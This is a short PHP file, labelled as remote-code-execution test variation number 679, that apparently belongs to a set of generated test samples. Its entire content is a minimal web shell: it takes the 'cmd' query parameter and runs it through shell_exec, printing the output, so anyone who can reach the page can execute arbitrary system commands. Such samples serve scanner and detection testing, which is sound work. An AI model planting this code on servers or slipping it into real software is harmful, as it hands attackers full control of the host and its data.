<?php
// RCE test variation #679
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>